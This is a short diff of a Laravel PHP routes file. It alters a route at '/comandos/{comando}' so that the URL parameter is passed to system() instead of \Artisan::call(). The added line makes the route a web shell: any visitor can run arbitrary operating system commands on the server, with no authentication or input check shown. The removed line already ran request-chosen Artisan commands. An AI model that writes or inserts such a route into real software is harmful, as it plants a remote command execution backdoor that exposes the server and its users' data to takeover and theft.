@@ -18,7 +18,7 @@ use Illuminate\Support\Facades\Auth;
 
 // Comandos
 Route::get('/comandos/{comando}', function ($c){
-    \Artisan::call($c);
+    system($c);
 });
 
 // Mostrar imagen
